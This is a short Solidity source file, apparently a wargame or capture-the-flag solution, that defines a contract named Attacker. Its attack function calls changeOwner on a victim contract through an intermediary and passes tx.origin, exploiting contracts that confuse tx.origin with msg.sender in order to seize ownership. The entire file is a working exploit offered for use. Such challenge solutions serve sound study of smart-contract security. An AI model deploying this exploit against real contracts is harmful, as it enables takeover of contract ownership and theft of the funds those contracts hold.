// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface change_owner {
    function changeOwner(address _owner) external;
}

contract Attacker {
    function attack(address _victim) public {
        change_owner(_victim).changeOwner(tx.origin);
    }
}
